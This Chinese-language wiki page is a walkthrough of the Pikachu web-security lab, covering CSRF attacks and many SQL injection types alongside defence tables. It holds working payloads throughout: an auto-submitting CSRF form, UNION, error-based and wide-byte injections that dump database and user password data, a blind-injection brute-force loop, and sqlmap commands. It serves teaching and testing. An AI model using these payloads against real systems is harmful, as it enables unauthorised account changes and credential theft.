---
title: Pikachu靶场实战复现 Part 3：CSRF 与 SQL 注入全类型攻防详解
description: 基于无名安全团队归档文章，系统复现 Pikachu 靶场第 3 部分实战内容，涵盖 CSRF（GET/POST/Token）、SQL 注入（数字型/字符型/搜索型/XX型/增删改/HTTP
  Header/Cookie/盲注/宽字节）的原理、Payload 构造、利用链分析及防御思路，交叉引用现有知识库相关技术详解页面。
category: program-analysis
tags:
- Pikachu靶场
- CSRF
- SQL注入
- 漏洞复现
- 利用链分析
- 无名安全团队
- Web安全
date: 2024-01-15
updated: '2026-11-14'
---

## 概述

本页面基于无名安全团队成员 Geek_韧 的微信公众号归档文章《pikachu靶场&CSRF&SQL注入(三)》整理，系统复现 Pikachu 靶场中 **CSRF 跨站请求伪造** 与 **SQL 注入** 两大核心漏洞类型的完整攻击链。内容涵盖从漏洞原理分析、抓包构造 Payload、实战复现步骤到防御对策的完整知识体系，适合 Web 安全入门、CTF 实战巩固及渗透测试基础夯实。

> **系列导航**：
> - [[pikachu-target-writeup-part4]] — Part 4：RCE、文件包含、文件上传、越权漏洞
> - [[pikachu-target-writeup-part5]] — Part 5：目录遍历、信息泄露、PHP 反序列化、XXE、SSRF、不安全重定向

---

## 一、CSRF（跨站请求伪造）

### 漏洞原理与攻击模型

**核心定义**：跨站请求伪造（Cross-Site Request Forgery，CSRF）攻击者伪造受害者的请求，在受害者不知情/已登录状态下，强制其执行非本意的敏感操作（修改密码、转账、发帖等）。因仅需“一次点击”即可完成攻击，亦称 **"One Click Attack"**。

**攻击前置条件**：
1. 受害者已登录目标站点（持有有效 Session/Cookie）
2. 目标站点敏感操作接口**缺乏防伪造校验**（无 Token、验证码、Referer 检查、二次密码确认等）
3. 攻击者能构造出合法的请求参数结构（可通过注册账号、抓包分析获得）

**CSRF vs XSS 本质区别**：

| 维度 | CSRF | XSS |
|------|------|-----|
| 权限获取 | **借用**受害者权限，攻击者**不直接持有**凭证 | **窃取**受害者凭证（Cookie/Token），攻击者**直接持有**权限 |
| 攻击面 | 仅限“状态改变”类接口（POST/GET 写操作） | 任意 JS 执行上下文（读/写/窃取/键盘记录等） |
| 防御核心 | 请求唯一性校验（Token/Referer/二次验证） | 输入过滤、输出编码、CSP、HttpOnly |

> **关联阅读**：[[jwt漏洞原理与实战利用]] 中 JWT 在 CSRF 防御中的 Token 生成与验证实现细节；[[websocket-vulnerabilities-analysis]] 中跨站 WebSocket 劫持（CSWSH）作为 CSRF 变体的分析。

---

### CSRF-GET：最简利用链

**漏洞端点**：`/vul/csrf/csrfget/csrf_get_edit.php`

**请求特征**：参数全在 URL 查询串，无任何 Token/验证码/Referer 校验。

**抓包分析**（关键字段）：
```http
GET /vul/csrf/csrfget/csrf_get_edit.php?sex=girl&phonenum=123000000&add=giaogiao&email=lucy%40pikachu.com&submit=submit HTTP/1.1
Host: pikachu-master:8890
Cookie: PHPSESSID=2scm3ehko6qvbnj1a62uoghqk5
```

**攻击构造**：
```text
http://pikachu-master:8890/vul/csrf/csrfget/csrf_get_edit.php?sex=girl&phonenum=55556666&add=giaogiao&email=lucy%40pikachu.com&submit=submit
```

**利用流程**：
1. 攻击者注册账号 → 修改个人信息 → 抓包获取上述 URL 模板
2. 修改参数值为恶意数据 → 缩短/伪装链接（短链、二维码、图片 src）
3. 诱导已登录受害者点击/访问 → 浏览器自动携带 Cookie 发送请求 → 修改生效

**防御对策**：
- 敏感操作**强制改为 POST**（但 POST 也可被 CSRF，见下节）
- 增加 **Anti-CSRF Token**（服务端生成、校验、一次性）
- 校验 `Referer`/`Origin` 头（注意隐私模式/代理可能丢失）
- 关键操作要求**二次认证**（原密码、短信验证码、人机验证）

---

### CSRF-POST：自动提交表单绕过

**漏洞端点**：`/vul/csrf/csrfpost/csrf_post_edit.php`

**请求特征**：`Content-Type: application/x-www-form-urlencoded`，Body 携带参数，无 Token。

**抓包关键数据**：
```http
POST /vul/csrf/csrfpost/csrf_post_edit.php HTTP/1.1
Host: pikachu-master:8890
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=gdik1ol3e1pt60a8169b9c3jc5

sex=girl&phonenum=5555485&add=giaogiao888&email=lucy%40pikachu.com&submit=submit
```

**攻击页面构造**（攻击者自建站点 `http://csrf-post:8894/index.html`）：
```html
<html>
<head>
  <script>
    window.onload = function() {
      document.getElementById("postsubmit").click();
    }
  </script>
</head>
<body>
  <form method="post" action="http://pikachu-master:8890/vul/csrf/csrfpost/csrf_post_edit.php">
    <input id="sex" type="hidden" name="sex" value="girl" />
    <input id="phonenum" type="hidden" name="phonenum" value="999999999" />
    <input id="add" type="hidden" name="add" value="hacker" />
    <input id="email" type="hidden" name="email" value="lucy@pikachu.com" />
    <input id="postsubmit" type="submit" name="submit" value="submit" />
  </form>
</body>
</html>
```

**利用流程**：受害者登录状态下访问攻击页面 → `onload` 自动触发 `form.submit()` → 浏览器向目标站点发送 POST 请求 → 修改生效。

**防御补充**：
- **SameSite Cookie 属性**（`SameSite=Strict/Lax`）可有效阻断跨站 POST 提交
- `SameSite=None` 需配合 `Secure`（HTTPS），否则现代浏览器默认 `Lax` 已提供基础防护

---

### CSRF-Token：防御机制实战验证

**漏洞端点**：`/vul/csrf/csrftoken/token_get_edit.php`

**请求特征**：URL 中包含 `token=7060061088cfc779c8113985276`，每次刷新随机变化。

```http
GET /vul/csrf/csrftoken/token_get_edit.php?sex=girl&phonenum=123000000&add=giaogiao888&email=lucy%40pikachu.com&token=7060061088cfc779c8113985276&submit=submit HTTP/1.1
```

**防御原理**：
- 服务端生成**高熵随机 Token**，存入 Session，渲染至表单/链接
- 提交时校验 `request.token == session.token` 且**一次性失效**
- 攻击者无法预测/窃取 Token（无 XSS 前提下），伪造链接失效

**Token 设计要点**：
| 要素 | 推荐做法 |
|------|----------|
| 熵值 | ≥128 bit（CSPRNG 生成） |
| 作用域 | 绑定 Session，敏感操作单独 Token |
| 生命周期 | 单次使用即销毁（防重放） |
| 传递方式 | 隐藏表单字段 / 自定义 Header / URL 参数（最不推荐） |
| 防泄露 | 禁止出现在 Referer/日志/URL 历史中 |

---

## 二、SQL 注入全类型复现

> **知识库关联**：
> - [[ctfshow-web-sql-injection-bypass-basics]] — CTF-show SQLi 绕过基础（intval/正则/进制/位运算）
> - [[mysql-duplicate-entry-error-based-sqli]] — 报错注入 `floor(rand(0)*2)` 机制深度解析
> - [[mysql-dnslog-injection-loadfile-unc]] — DNSLog 盲注数据外带技术
> - [[mongodb-nosql-injection-guide]] — NoSQL 注入四大手法对比
> - [[ssrf-bypass-techniques]] — SSRF 绕过技巧（部分 Payload 复用思路）

---

### 数字型注入

**特征**：参数直接拼入 SQL 数值位置，无引号包裹。

**测试 Payload**：
```text
id=1 and 1=1     -- 正常返回
id=1 and 1=2     -- 空/异常返回
```

**利用流程**：
1. 判断回显位数 → `order by N`
2. 联合查询 → `union select 1,2,3...`
3. 爆库/表/列/数据 → `union select 1,database(),3...`

---

### 字符型注入

**特征**：参数拼入 SQL 字符串位置，需**闭合单引号**。

**代码推测**：
```php
$name = $_GET['sss'];
$sql = "select col1,col2 from table where name = '$name'";
```

**闭合 Payload**：
```text
' or 1=1--+
' or 1=1#
' or '1'='1
```

**实战验证**：
```text
?keyword=' or 1=1--+   →  返回所有记录
```

---

### 搜索型注入

**特征**：参数用于 `LIKE` 模糊查询，往往包裹 `%`。

**代码推测**：
```php
$sql = "select * from table where title like '%{$keyword}%'";
```

**闭合策略**：
```text
' on 1=1 #           -- 闭合前引号，注释掉后引号和 %
' union select 1,2,3--+
```

**组合利用**：文章中同时触发 XSS：`'on 1=1 # <script>alert(555)</script>`

---

### XX 型注入（双引号/括号闭合）

**特征**：参数被包裹在 `')` 或 `")` 等复合结构中。

**Payload**：
```text
') or 1=1-- 
```
> 注意 `--` 后**必须有空格**，否则 MySQL 不视为注释起始。

---

### Insert / Update / Delete 注入（报错注入核心）

> **核心差异**：DML 操作无回显，不能用 `UNION`，需借助**报错回显**或**盲注**提取数据。

#### 三大报错函数原理

| 函数 | 语法 | 报错触发条件 | 典型 Payload |
|------|------|--------------|--------------|
| `UpdateXML()` | `UpdateXML(xml_target, xpath_expr, new_xml)` | `xpath_expr` 语法错误 | `1' and UpdateXML(1,concat('~',database()),1)#` |
| `ExtractValue()` | `ExtractValue(xml_frag, xpath_expr)` | `xpath_expr` 语法错误 | `1' and ExtractValue(1,concat('~',database()))#` |
| `Floor()` | `floor(rand(0)*2)` | 需 `count()` + `group by` + `rand()` 组合 | `1' and (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#` |

**Floor 报错机制深度**：
1. `rand(0)` 固定种子 → 序列 `0,1,1,0,1,1...`
2. `floor(rand(0)*2)` → `0,1,1,0,1,1...`
3. `group by` 创建虚拟表，主键为上述序列
4. 插入第 3 行时主键冲突（重复 `1`）→ **Duplicate entry** 报错，错误信息包含 `concat()` 结果

> 详细原理见 [[mysql-duplicate-entry-error-based-sqli]]。

#### 实战端点与 Payload

| 操作 | 端点 | 示例 Payload |
|------|------|--------------|
| **Insert** | `/vul/sqli/sqli_ins.php` | `kobe',(select UpdateXML(1,concat('~',database()),1)),'test')#` |
| **Update** | `/vul/sqli/sqli_up.php` | `kobe' and UpdateXML(1,concat('~',database()),1)#` |
| **Delete** | `/vul/sqli/sqli_del.php` | `kobe' and ExtractValue(1,concat('~',database()))#` |

**版本号获取（Floor 法）**：
```text
kobe ' or (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a )#
```

---

### HTTP Header 注入（User-Agent / Referer / X-Forwarded-For 等）

**场景**：应用将 Header 直接拼入 SQL（如日志记录、统计分析）。

**测试端点**：UA 头注入

**Payload 构造**（Burp Suite 修改 UA）：
```http
User-Agent: 1' or updatexml(1,concat(0x7e,database()),0) or'
```

**利用要点**：
- 需抓包工具（Burp）拦截修改 Header
- 同理适用于 `Referer`、`X-Forwarded-For`、`Cookie` 等

---

### Cookie 注入

**场景**：`Cookie` 值未过滤直接入库/查询。

**测试方法**：Burp 修改 `Cookie` 字段注入 Payload，同 Header 注入。

---

### 盲注（Boolean-based / Time-based）

**触发条件**：后台屏蔽报错（如 `@mysqli_query`）、无回显、无报错信息。

#### 布尔盲注

**判断逻辑**：构造条件 `AND <条件>`，观察页面**正常/异常**差异。

**验证步骤**：
```text
kobe' and 1=1#      → 正常（真）
kobe' and 1=2#      → 异常（假）
```

**自动化爆破脚本思路**：
```python
# 伪代码：二分法爆库长度 → 逐位爆字符
for pos in range(1, length+1):
    for ascii in range(32, 127):
        payload = f"kobe' and (ord(mid(database(),{pos},1))={ascii})#"
        if is_true(payload):
            result += chr(ascii)
            break
```

**实战验证**：
- `kobe' and (length(database())=7)#` → 正常 → 库名长度 7
- `kobe' and (ord(mid(database(),1,1))=112)#` → 正常 → 首字符 'p' (ASCII 112)

#### 时间盲注

**判断逻辑**：利用 `IF(条件, SLEEP(秒), 0)` 或 `BENCHMARK()` 观察**响应延迟**。

**Payload**：
```text
kobe' and if(length(database())=7,sleep(3),1)#
```

**工具化建议**：`sqlmap --technique=T`、`sqlmap --time-sec=3` 自动化跑盲注。

---

### 宽字节注入（GBK 编码特性利用）

#### 核心原理

**前置条件**：
- PHP 连接 MySQL 设置 `SET character_set_client = gbk`
- 应用使用 `addslashes()`/`mysql_real_escape_string()` 转义单引号

**编码转换链**：
```text
用户输入:  %df%27  (即 %df ')
GBK 解码:  %df%5c%27 → 字节序列: DF 5C 27
MySQL GBK 视角:  DF 5C = "运" (一个汉字), 27 = 单引号 ' 逃逸
结果:        单引号未被转义，成功闭合
```

**关键点**：
- `%df` (十进制 223) > 128 → 满足 GBK 双字节首字节范围
- `%5c` (`\`) 被“吃掉”合成汉字，不再作为转义符

#### 实战复现

**登录端点测试**（Burp 抓包修改 username）：
```text
username=1%df' or 1=1 #&password=xxx
```

**联合查询推进**：
```text
# 爆表名
1%df' union select 1,2 #

# 爆指定库表名
1%df' union select (select group_concat(table_name) from information_schema.tables where table_schema=database()),2 #

# 爆字段名（第 4 个表）
1%df' union select (select group_concat(column_name) from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 3,1)),2#

# 拖库（用户名;密码）
1%df' union select (select group_concat(username,0x3b,password) from pikachu.users),2#
```

**后续**：获取的 MD5 哈希离线破解（彩虹表/撞库/GPU 爆破）。

---

## 三、防御体系总结

### SQL 注入防御矩阵

| 防御层面 | 措施 | 有效性 | 备注 |
|----------|------|--------|------|
| **代码层** | **参数化查询 / PreparedStatement** | ⭐⭐⭐⭐⭐ 根治 | 编译时区分代码/数据，见 [[java-preparedstatement-sql-injection-defense]] |
| **代码层** | ORM 框架安全用法（禁用原生 SQL 拼接） | ⭐⭐⭐⭐ | 注意 `whereRaw`/`execute` 等危险方法 |
| **代码层** | 输入验证（白名单/类型/长度/格式） | ⭐⭐⭐ | 辅助防御，不可单独依赖 |
| **代码层** | 严格错误处理（不回显 SQL 错误堆栈） | ⭐⭐⭐ | 防信息泄露辅助盲注 |
| **数据库层** | 最小权限账号（仅 `SELECT/INSERT/UPDATE/DELETE`） | ⭐⭐⭐ | 限制 `DROP`/`GRANT`/`FILE` 等高危权限 |
| **数据库层** | 禁用/限制危险函数（`load_file`、`into outfile`、UDF） | ⭐⭐ | 防 Getshell |
| **网络层** | WAF/IPS 规则拦截常见 Payload 特征 | ⭐⭐ | 可被绕过，非银弹 |
| **审计层** | SQL 审计日志 + 异常告警 | ⭐⭐⭐ | 事后溯源、实时阻断 |

### CSRF 统一防御清单

| 措施 | 适用场景 | 实现要点 |
|------|----------|----------|
| **Anti-CSRF Token** | 所有写操作接口 | 服务端生成高熵 Token，Session 绑定，单次校验销毁 |
| **SameSite Cookie** | 全站 / 关键业务 | `SameSite=Strict`（最强）/ `Lax`（平衡），需 HTTPS 配合 `Secure` |
| **Referer/Origin 校验** | 无法部署 Token 的遗留系统 | 允许空 Referer（隐私模式），白名单域名匹配 |
| **二次认证** | 超敏感操作（改密、转账、删库） | 原密码/短信/邮件/TOTP/生物特征 |
| **验证码/人机识别** | 登录、注册、高频写接口 | 图形/滑块/行为分析，防自动化脚本批量利用 |

---

## 四、实战工具与自动化推荐

| 场景 | 推荐工具 | 关键参数示例 |
|------|----------|--------------|
| **SQLi 自动化检测/利用** | `sqlmap` | `sqlmap -u "url" --batch --dbs --technique=BEUSTQ --time-sec=5` |
| **SQLi API 批量化** | `sqlmapapi` / 自定义 Python 脚本 | 见 [[sqlmap-api-automation]] |
| **CSRF PoC 生成** | `csrfpoc` / Burp Suite CSRF PoC 插件 | 一键生成自动提交表单 HTML |
| **宽字节/编码转换测试** | Burp Intruder + 自定义编码 Payload | Payload 列表：`%df%27`, `%e5%5c%27` 等 |
| **盲注半自动化** | `sqlmap --technique=B/T` / 手写 Python 二分脚本 | 配合 `--threads 10` 加速 |

---

## 五、交叉引用导航

| 知识点 | 关联页面 | 说明 |
|--------|----------|------|
| Pikachu 靶场系列 Part 4 | [[pikachu-target-writeup-part4]] | RCE、文件包含、文件上传、越权 |
| Pikachu 靶场系列 Part 5 | [[pikachu-target-writeup-part5]] | 目录遍历、信息泄露、反序列化、XXE、SSRF |
| PHP 伪协议与反序列化 | [[php伪协议与反序列化利用]] | 文中提及 Pikachu 反序列化实战 |
| SSRF 实战指南 (Pikachu) | [[ssrf-ctf-exploitation-guide]] | `file_get_contents` vs `curl` 协议差异利用 |
| CTF-show SQLi 绕过基础 | [[ctfshow-web-sql-injection-bypass-basics]] | 入门级绕过技巧系统化 |
| MySQL 报错注入深度解析 | [[mysql-duplicate-entry-error-based-sqli]] | `floor(rand(0)*2)` 机制详解 |
| MySQL DNSLog 外带 | [[mysql-dnslog-injection-loadfile-unc]] | 盲注无回显时的数据外带技术 |
| NoSQL 注入全景 | [[mongodb-nosql-injection-guide]] | MongoDB 四大注入手法对比 |
| JWT 与 CSRF 防御 | [[jwt漏洞原理与实战利用]] | Token 生成验证源码级分析 |
| WebSocket 劫持 (CSRF 变体) | [[websocket-vulnerabilities-analysis]] | CSWSH 攻击原理与复现 |
| XXE 基础与利用 | [[xxe-xml-dtd-fundamentals]] | 外部实体注入核心原理 |
| SSRF 绕过技巧集锦 | [[ssrf-bypass-techniques]] | 五大核心绕过手法与多协议利用链 |

---

## 六、版本记录

| 版本 | 日期 | 变更说明 |
|------|------|----------|
| 1.0 | 2024-01-15 | 初版：整合无名安全团队归档文章，构建 CSRF 与 SQLi 完整知识页，补充交叉引用与防御矩阵 |

---

> **免责声明**：本页面仅供安全研究、教学演示、授权渗透测试使用。未经授权对目标系统进行漏洞扫描/利用属违法行为，使用者需自行承担法律责任。

## 来源

- [0x00实验室-202108-202304_077](../sources/0x00实验室-202108-202304_077.md)
